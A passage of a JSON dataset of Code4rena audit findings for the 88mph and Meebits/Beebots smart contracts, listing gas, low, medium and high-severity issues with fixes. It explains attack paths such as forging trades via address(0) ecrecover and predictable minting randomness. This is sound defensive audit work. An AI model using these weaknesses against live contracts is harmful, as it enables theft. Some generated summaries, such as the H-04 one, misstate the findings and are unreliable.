ERC1155Upgradeable.safeTransferFrom(address,address,uint256,uint256,bytes) (contracts/libs/ERC1155Upgradeable.sol#178-190)\nsafeBatchTransferFrom(address,address,uint256[],uint256[],bytes) should be declared external:\n        - ERC1155Upgradeable.safeBatchTransferFrom(address,address,uint256[],uint256[],bytes) (contracts/libs/ERC1155Upgradeable.sol#195-207)\nincreaseAllowance(address,uint256) should be declared external:\n        - ERC20Wrapper.increaseAllowance(address,uint256) (contracts/libs/ERC20Wrapper.sol#146-157)\ndecreaseAllowance(address,uint256) should be declared external:\n        - ERC20Wrapper.decreaseAllowance(address,uint256) (contracts/libs/ERC20Wrapper.sol#173-186)\nmint(address,uint256) should be declared external:\n        - ERC20Mock.mint(address,uint256) (contracts/mocks/ERC20Mock.sol#7-9)\ndeposit(uint256) should be declared external:\n        - VaultMock.deposit(uint256) (contracts/mocks/VaultMock.sol#16-21)\nwithdraw(uint256) should be declared external:\n        - VaultMock.withdraw(uint256) (contracts/mocks/VaultMock.sol#23-29)\ndeposit(uint256) should be declared external:\n        - VaultWithDepositFeeMock.deposit(uint256) (contracts/mocks/VaultWithDepositFeeMock.sol#23-33)\nwithdraw(uint256) should be declared external:\n        - VaultWithDepositFeeMock.withdraw(uint256) (contracts/mocks/VaultWithDepositFeeMock.sol#35-41)\nupdateAndQuery() should be declared external:\n        - EMAOracle.updateAndQuery() (contracts/models/interest-oracle/EMAOracle.sol#55-84)\nquery() should be declared external:\n        - EMAOracle.query() (contracts/models/interest-oracle/EMAOracle.sol#86-88)\ninitialize() should be declared external:\n        - MPHToken.initialize() (contracts/rewards/MPHToken.sol#19-23)\nownerMint(address,uint256) should be declared external:\n        - MPHToken.ownerMint(address,uint256) (contracts/rewards/MPHToken.sol#26-33)\n```\n\n\n## Tools Used\n\nSlither",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/18",
      "tags": [],
      "finders": []
    },
    {
      "id": "4041",
      "title": "[L-05] function payInterestToFunders does not have a re-entrancy modifier",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nfunction payInterestToFunders does not have a re-entrancy modifier. I expect to see this modifier because similar functions (including sponsored version) have it.\n\n## Recommended Mitigation Steps\nAdd 'nonReentrant' to function payInterestToFunders.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/6",
      "tags": [],
      "finders": []
    },
    {
      "id": "4040",
      "title": "[L-04] Add extra error message in_depositRecordData",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nIn the function _depositRecordData of DInterest.sol, interestAmount is lowered with feeAmount.\nIf by accident feeAmount happens to be larger than interestAmount an error occurs and the execution stops, without an error message.\nThis might make troubleshooting this situation more difficult.\n\n## Proof of Concept\nDInterest.sol:\n function _depositRecordData(..) {\n    ...\n    interestAmount -= feeAmount;\n\n## Tools Used\nEditor\n\n## Recommended Mitigation Steps\nPerhaps add something like:\n require(interestAmount >= feeAmount,\"DInterest: fee too large\");",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/7",
      "tags": [],
      "finders": []
    },
    {
      "id": "4039",
      "title": "[L-03] Extra precautions in updateAndQuery",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function updateAndQuery of EMAOracle.sol subtracts the incomeIndex with the previous incomeIndex.\nThese incomeIndex values are retrieved via the moneyMarket contract from an external contract.\n\nIf by accident the previous incomeIndex is larger than the current incomeIndex then the subtraction would be negative and the code halts (reverts), without an error message.\nAlso the updateAndQuery function would not be able to execute (until the current incomeIndex is larger than the previous incomeIndex).\n\nThis situation could occur when an error occurs in one of the current or future money markets.\n\n## Proof of Concept\nEMAOracle.sol:\n  function updateAndQuery() {\n        ...\n        uint256 _lastIncomeIndex = lastIncomeIndex;\n        ...\n        uint256 newIncomeIndex = moneyMarket.incomeIndex();\n        uint256 incomingValue =\n            (newIncomeIndex - _lastIncomeIndex).decdiv(_lastIncomeIndex) /\n                timeElapsed;\n\n## Tools Used\nEditor\n\n## Recommended Mitigation Steps\nGive an error message when the previous incomeIndex is larger than the current incomeIndex.\nAnd/or create a way to recover from this erroneous situation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/10",
      "tags": [],
      "finders": []
    },
    {
      "id": "4038",
      "title": "[L-02] Anyone can withdraw vested amount on behalf of someone",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `Vesting.withdrawVested` function allows withdrawing the tokens of other users.\nWhile the tokens are sent to the correct address, this can lead to issues with smart contracts that might rely on claiming the tokens themselves.\n\nAs one example, suppose the `_to` address corresponds to a smart contract that has a function of the following form:\n\n```solidity\nfunction withdrawAndDoSomething() {\n    contract.withdrawVested(address(this), amount);\n    token.transfer(externalWallet, amount)\n}\n```\n\n## Impact\n\nIf the contract has no other functions to transfer out funds, they may be locked forever in this contract.\n\n## Recommended Mitigation Steps\n\nDo not allow users to withdraw on behalf of other users.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/15",
      "tags": [],
      "finders": []
    },
    {
      "id": "4037",
      "title": "[L-01] Use openzeppelin ECDA for erecover",
      "impact": "LOW",
      "content": "## Handle\n\na_delamo\n\n\n## Vulnerability details\n\n## Impact\n\nIn `Sponsorable.sol` is using erecover directly to verify the signature.\nBeing such a critical piece of the protocol, I would recommend using the ECDSA from openzeppelin as it does more validations when verifying the signature. \n\n```\n // Currently\n\n address recoveredAddress =\n      ecrecover(digest, sponsorship.v, sponsorship.r, sponsorship.s);\n    require(\n      recoveredAddress != address(0) && recoveredAddress == sponsorship.sender,\n      \"Sponsorable: invalid sig\"\n    );\n\n\n  //ECDSA\n\n   function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (281): 0 < s < secp256k1n ÷ 2 + 1, and for v in (282): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, \"ECDSA: invalid signature 's' value\");\n        require(v == 27 || v == 28, \"ECDSA: invalid signature 'v' value\");\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        require(signer != address(0), \"ECDSA: invalid signature\");\n\n        return signer;\n    }\n  \n```\n## Tools Used\n\nNone",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "4036",
      "title": "[M-02] Unchecking the ownership of mph in function distributeFundingRewards could cause several critical functions to revert",
      "impact": "MEDIUM",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nIn contract `MPHMinter`, the function `distributeFundingRewards` does not check whether the contract itself is the owner of `mph`. If the contract is not the owner of `mph`, `mph.ownerMint` could revert, causing functions such as `withdraw`, `rolloverDeposit`, `payInterestToFunders` in the contract `DInterest` to revert as well.\n\n## Proof of Concept\n\nReferenced code:\n[MPHMinter.sol#L121](https://github.com/code-423n4/2021-05-88mph/blob/main/contracts/rewards/MPHMinter.sol#L121)\n[DInterest.sol#L1253](https://github.com/code-423n4/2021-05-88mph/blob/main/contracts/DInterest.sol#L1253)\n[DInterest.sol#L1420](https://github.com/code-423n4/2021-05-88mph/blob/main/contracts/DInterest.sol#L1420)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd a `mph.owner() != address(this)` check as in the other functions (e.g., `mintVested`).",
      "summary": "\nThis bug report is about a vulnerability in the contract MPHMinter and its impact on the functions in the contract DInterest. The vulnerability is that the function distributeFundingRewards does not check whether the contract itself is the owner of mph. If the contract is not the owner of mph, mph.ownerMint could revert, causing functions such as withdraw, rolloverDeposit, payInterestToFunders in the contract DInterest to revert as well. The proof of concept provided code references to MPHMinter.sol#L121, DInterest.sol#L1253 and DInterest.sol#L1420. No tools were used to identify this vulnerability. The recommended mitigation step is to add a mph.owner() != address(this) check as in the other functions (e.g., mintVested).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/23",
      "tags": [],
      "finders": []
    },
    {
      "id": "4035",
      "title": "[M-01] Incompatability with deflationary / fee-on-transfer tokens",
      "impact": "MEDIUM",
      "content": "\nThe `DInterest.deposit` function takes a `depositAmount` parameter but this parameter is not the actual transferred amount for fee-on-transfer / deflationary (or other rebasing) tokens.\n\nThe actual deposited amount might be lower than the specified `depositAmount` of the function parameter.\n\nThis would lead to wrong interest rate calculations on the principal.\n\nRecommend transferring the tokens first and comparing pre-/after token balances to compute the actual deposited amount.\n\n**[ZeframLou (88mph) acknowledged](https://github.com/code-423n4/2021-05-88mph-findings/issues/16#issuecomment-844441370):**\n> While this is true, we have no plans to support fee-on-transfer or rebasing tokens.\n\n",
      "summary": "\nThis bug report is about the `DInterest.deposit` function in the code. The `depositAmount` parameter of the function is not the actual transferred amount for fee-on-transfer / deflationary (or other rebasing) tokens. This means that the actual deposited amount might be lower than the specified `depositAmount` of the function parameter, leading to wrong interest rate calculations on the principal. To fix this, it is recommended to transfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/16",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": []
    },
    {
      "id": "42179",
      "title": "[G-07] `PauseMarket()` can be optimized",
      "impact": "GAS",
      "content": "\nThe function `pauseMarket()` on line 230 can be optimized.\n\nRecommend not using an argument and set ```marketPaused = !marketPaused```.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "42178",
      "title": "[G-06] `Require()` not needed",
      "impact": "GAS",
      "content": "\nOn line 650, `require(amount <= ethBalance[msg.sender]);` is not needed because it's implicitly checked when making the subtraction in the following line.\n\nRecommend removing the `require()`.\n\n**[dangerousfood (Meebits) commented](https://github.com/code-423n4/2021-04-meebits-findings/issues/67#issuecomment-847430433):**\n> Fantastic catch imo.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/67",
      "tags": [],
      "finders": []
    },
    {
      "id": "42177",
      "title": "[G-05] `creatorNftMints` is assigned only 0 or 1",
      "impact": "GAS",
      "content": "\nIt is unclear why this mapping points to uint: ```mapping (uint256 => uint256) public creatorNftMints; ``` the only values it could get is either 0 or 1, so a boolean type might be more suitable here.\n\nRecommend using true/false values if the intention was that 0 means false and 1 means true:\n```solidity\nmapping (uint256 => boolean) public creatorNftMints;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/68",
      "tags": [],
      "finders": []
    },
    {
      "id": "42176",
      "title": "[G-00] Explicit initialization with zero not required for `numTokens`",
      "impact": "GAS",
      "content": "\nExplicit initialization with zero is not required for variable declaration of `numTokens` because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.\n\nRecommend removing explicit initialization with zero.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/26",
      "tags": [],
      "finders": []
    },
    {
      "id": "42175",
      "title": "[M-02] instead of `call()` , `transfer()` is used to withdraw the ether",
      "impact": "MEDIUM",
      "content": "\n```solidity\nfunction withdraw(uint amount) external {\n  require(amount <= ethBalance[msg.sender]);\n  ethBalance[msg.sender] = ethBalance[msg.sender].sub(amount);\n  msg.sender.transfer(amount);\n  emit Withdraw(msg.sender, amount);\n}\n```\n\nTo withdraw ETH, it uses `transfer()`, this transaction will fail inevitably when:\n\n1. The withdrawer smart contract does not implement a payable function.\n2. Withdrawer smart contract does implement a payable fallback which uses more than 2300 gas unit.\n3. The withdrawer smart contract implements a payable fallback function that needs less than 2300 gas units but is called through proxy, raising the call's gas usage above 2300.\n\nRecommend using `call()` to send ETH.\n\n",
      "summary": "\nThe report states that there is a bug in the code that allows users to withdraw ETH. The function used for withdrawal, `withdraw()`, uses `transfer()` which can fail in certain situations. This includes when the smart contract does not have a function to receive ETH, when the fallback function uses more than 2300 gas units, or when the fallback function is called through a proxy and raises the gas usage above 2300. It is recommended to use `call()` instead of `transfer()` for sending ETH to avoid this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/2",
      "tags": [],
      "finders": []
    },
    {
      "id": "42174",
      "title": "[M-01] `randomIndex` is not truly random - possibility of predictably minting a specific token Id",
      "impact": "MEDIUM",
      "content": "\n`randomIndex' is not random. Any miner has access to these values:\n\n```solidity\nuint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;\n```\n\nNon-miner attackers could also test the minting random condition until they get the ID they are looking to access.\n\nThe internal variable [`indices`](https://github.com/code-423n4/2021-04-meebits/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L158) seems to be used to avoid this type of collision.\n\nWhile this makes it less straightforward, there is still the possibility of minting a token with a specific ID.\n\nThat said, [`_addNFToken`](https://github.com/code-423n4/2021-04-meebits/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L408) is checking if the token is already owned by an address, ensuring a token can't be stolen.\n\nRefactoring as suggested below will save gas, make code easier to read and prevent reverts in rare unfortunate occasions of clashes.\n\nRecommend not generating random IDs and instead using counters. It makes the code more predictable and easier to read, avoids clashing of IDs, and reduces the need to track minted tokens.\n\n",
      "summary": "\nThe bug report discusses an issue with the `randomIndex` function in the `Beebots.sol` contract. This function is used to generate random IDs for tokens, but it is not truly random. This means that anyone, including non-miners, can potentially access specific IDs by repeatedly testing the function. The report suggests using the internal variable `indices` to prevent collisions, but there is still a possibility of minting a token with a specific ID. To address this, the report recommends refactoring the code to use counters instead of generating random IDs. This will make the code more predictable, easier to read, and prevent clashes of IDs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/30",
      "tags": [],
      "finders": []
    },
    {
      "id": "42173",
      "title": "[H-04] function `tokenByIndex` treats last index as invalid",
      "impact": "HIGH",
      "content": "\nNFT indexes start from 0:\n```solidity\n// Don't allow a zero index, start counting at 1\nreturn value.add(1);\n```\nSo if there are 30 tokens, indexes would be 1-30. However, function `tokenByIndex` sets such boundaries:\n```solidity\nrequire(index > 0 && index < TOKEN_LIMIT);\n```\nThis means that the last token (with index 30 in this case) will not be valid.\n\nRecommend using:\n```solidity\nrequire(index > 0 && index <= TOKEN_LIMIT);\n```\n\n**[dangerousfood (Meebits) commented](https://github.com/code-423n4/2021-04-meebits-findings/issues/73#issuecomment-847429563):**\n> Beebots is indexing by 1\n\n",
      "summary": "\nThe bug report is about a problem with the indexing of non-fungible tokens (NFTs). The report explains that currently, the indexes for NFTs start from 0, meaning that if there are 30 tokens, their indexes would be 0-29. However, there is a function called `tokenByIndex` which sets boundaries for the indexes, and it only allows indexes from 1-29. This means that the last token (with index 29) will not be considered valid. The report suggests changing the boundaries to allow for the last token to be included. A comment from a user also mentions that another project, Beebots, is indexing by 1, which could potentially cause confusion for users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/73",
      "tags": [],
      "finders": []
    },
    {
      "id": "42172",
      "title": "[H-03] `Beebots.TradeValid()` Will Erroneously Return True When Maker Is Set To `Address(0)` and `makerIds` Are Set To The `TokenIds` of Unminted Beebot NFTs",
      "impact": "HIGH",
      "content": "\n`Beebots.TradeValid()` will erroneously return true when `maker` is set to `address(0)` and `makerIds` are set to the `tokenIds` of unminted beebot NFTs.\n\n`Beebots.verify()` returns true no matter what signature is given when signer is set to `address(0)`. This means that `BeeBots.tradeValid()` will erroneously return true when `maker` is set to `address(0)`.\n\nFinally, before an NFT has even been minted at all, it is assumed to have an owner of `address(0)` due to the `idToOwner` mapping being initialized to zero for all uninitialized slots, so an attacker can call `tradeValid()` with `maker` set to `address(0)` and `makerIds` set to the `tokenIds` of any unminted `nftIds`, and `tradeValid()` will erroneously return true.\n\n* (1) `Beebots.verify()` returns true no matter what signature is given when signer is set to `address(0)`.\n  * (1a) `BeeBots.verify()` does not check to ensure that signer is not `address(0)`.\n  * (1b) This is a problem because `ecrecover` fails silently if the signature does not match and returns zero.\n  * (1c) So if an attacker passes in `address(0)` as the signer, then verify will return true no matter what signature is provided, since `ecrecover` will return `address(0)`, and the signer is `address(0)`, so verify will pass.\n  * (1d) This means that `BeeBots.tradeValid()` will erroneously return true when maker is set to `address(0)`.\n* (2) Before an NFT has even been minted at all, it is assumed to have an owner of `address(0)` due to the `idToOwner` mapping being initialized to zero for all uninitialized slots\n  * (2a) Solidity initializes all mappings to 0 for all slots that have not yet been set.\n  * (2b) So for any NFT ID that has not yet been minted, the corresponding owner in the mapping `BeeBots.idToOwner` is `address(0)`, even though that NFT should not even exist.\n  * (2c) This means that an attacker can call `tradeValid()` with maker set to `address(0)` and makerIds set to any unminted nftIds, and `tradeValid()` will erroneously return true.\n\n(1) Recommend adding this check to `Beebots.verify()`:\n```require(signer != address(0), \"Cannot verify signatures from 0x0\");```\n\n(2) Recommend adding this check to `Beebots.tradeValid()`:\n```require(maker != address(0), \"Maker 0x0 not allowed\");```\n\n**[dangerousfood (Meebits) commented](https://github.com/code-423n4/2021-04-meebits-findings/issues/77#issuecomment-847413820):**\n> Wow, this exploit is absolutely stunning.\n\n",
      "summary": "\nThis bug report discusses an issue with the `Beebots` smart contract. The `Beebots.TradeValid()` function will incorrectly return a true value when `maker` is set to `address(0)` and `makerIds` are set to the `tokenIds` of unminted beebot NFTs. This is due to two main issues: first, the `Beebots.verify()` function does not check to ensure that the signer is not `address(0)`, allowing an attacker to pass in `address(0)` as the signer and return a true value no matter what signature is provided. Second, before an NFT has been minted, the `idToOwner` mapping is initialized to `address(0)`, meaning an attacker can call `tradeValid()` with `maker` set to `address(0)` and `makerIds` set to any unminted NFT IDs, resulting in an erroneous true value being returned. The report recommends adding checks to both functions to prevent these issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/77",
      "tags": [],
      "finders": []
    },
    {
      "id": "42171",
      "title": "[H-01] Signature malleability of EVM's `ecrecover` in `verify()`",
      "impact": "HIGH",
      "content": "\nEVM's `ecrecover` is susceptible to signature malleability, which allows replay attacks, but that is mitigated here by tracking accepted offers and canceling them (on L645) specifically to prevent replays. However, if any application logic changes, it might make signature malleability a risk for replay attacks.\n\nSee [reference](https://swcregistry.io/docs/SWC-117).\n\nRecommend using [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)\n\n",
      "summary": "\nThe report discusses a bug in EVM's `ecrecover` function which can make it vulnerable to replay attacks due to signature malleability. However, this has been mitigated by tracking accepted offers and canceling them. It is recommended to use OpenZeppelin's ECDSA library to prevent this bug. Any changes in application logic may make signature malleability a risk for replay attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/54",
      "tags": [],
      "finders": []
    },
    {
      "id": "42170",
      "title": "[H-00] ERC-721 Enumerable Spec mismatch for index of `tokenByIndex()` function",
      "impact": "HIGH",
      "content": "\nIndex starts at 0 for token array, but the implementation here requires index to be greater than 0. This will prevent querying of tokens at index 0.\n\nSee [reference implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3ba2a1354f8f830d5a0e711537efdbdd8bcb109e/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L21).\n\nThis will impact compatibility with NFT platforms that expect full conformity with ERC-721 specification.\n\nRecommend accepting 0 index by changing to `require(index >= 0 && index < TOKEN_LIMIT);`.\n\n**[dangerousfood (Meebits) commented](https://github.com/code-423n4/2021-04-meebits-findings/issues/47#issuecomment-847429104):**\n> Beebots indexes by 1 for whatever reason\n\n",
      "summary": "\nThe bug report states that there is an issue with the implementation of an index in a token array. The current implementation requires the index to be greater than 0, but the index actually starts at 0. This means that querying tokens at index 0 is not possible. This could cause compatibility issues with NFT platforms that expect full conformity with the ERC-721 specification. The recommended solution is to change the implementation to accept 0 index by using `require(index >= 0 && index < TOKEN_LIMIT)`. A user also commented that another platform indexes by 1, which could be a potential source of confusion.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-redacted",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/47",
      "tags": [],
      "finders": []
    },
    {
      "id": "3990",
      "title": "[G-07] `PauseMarket()` can be optimized",
      "impact": "GAS",
      "content": "## Handle\n\ns1m0\n\n\n## Vulnerability details\n\n## Impact\nThe function pauseMarket() on line 230 can be optimized.\n\n## Proof of Concept\n-\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nDon't use an argument and set marketPaused = !marketPaused",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "3989",
      "title": "[G-06] `Require()` not needed",
      "impact": "GAS",
      "content": "## Handle\n\ns1m0\n\n\n## Vulnerability details\n\n## Impact\non line 650 require(amount <= ethBalance[msg.sender]); is not needed because it's implicitly checked when making the subtraction in the following line\n\n## Proof of Concept\n-\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nRemove the require()",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/67",
      "tags": [],
      "finders": []
    },
    {
      "id": "3988",
      "title": "[G-05] `creatorNftMints` is assigned only 0 or 1",
      "impact": "GAS",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nIt is unclear why this mapping points to uint: mapping (uint256 => uint256) public creatorNftMints; the only values it could get is either 0 or 1 so a boolean type might be more suitable here.\n\n## Recommended Mitigation Steps\nuse true/false values if the intention was that 0 means false and 1 means true:\nmapping (uint256 => boolean) public creatorNftMints;",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/68",
      "tags": [],
      "finders": []
    },
    {
      "id": "3987",
      "title": "[G-04] Optimizations storage",
      "impact": "GAS",
      "content": "\nSuggestions provided [here](https://gist.github.com/alexon1234/126320751f7a108e9aaf74c8d147d7df).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/83",
      "tags": [],
      "finders": []
    },
    {
      "id": "3986",
      "title": "[G-03] public function that could be declared external",
      "impact": "GAS",
      "content": "\npublic function that could be declared external to save gas\n```solidity\n1.totalSupply()\n2.tokenByIndex(uint256)\n3.hashToSign(address,address,uint256,uint256[],uint256,uint256[],uint256,uint256)\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/5",
      "tags": [],
      "finders": []
    },
    {
      "id": "3985",
      "title": "[G-02] state variables that could be declared constant",
      "impact": "GAS",
      "content": "\nThese state variables can be declared constants to save the gas: `nftName` and `nftSymbol`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/3",
      "tags": [],
      "finders": []
    },
    {
      "id": "3984",
      "title": "[G-01] Numerous Gas Optimizations",
      "impact": "GAS",
      "content": "\nThis finding is dedicated to the numerous gas optimizations that can be applied across the codebase.\n\n- The `tradeValid`, `cancelOffer`, and `acceptTrade` functions should have their `memory` arrays declared as `calldata`, significantly reducing the gas costs of the functions.\n- The `require` statements of L629 and L650 are redundant as the usage of `SafeMath` inherently guarantees them.\n- The `deployer`, `beta`, `alpha`, and `beneficiary` variables can all be declared as `immutable` since they are assigned only once during the contract's `constructor`.\n- The `SafeMath` statements of L333, L337, L349, and L385 are redundant as they are guaranteed to be safe due to surrounding `require` and `if` clauses.\n- The `abi.encodePacked` invocations of L539 and L541 are redundant given that the elements of the arrays cannot be tight packed since they each occupy a full 256-bit slot.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/15",
      "tags": [],
      "finders": []
    },
    {
      "id": "3983",
      "title": "[G-00] Explicit initialization with zero not required for `numTokens`",
      "impact": "GAS",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nExplicit initialization with zero is not required for variable declaration of numTokens because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L141\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nRemove explicit initialization with zero.",
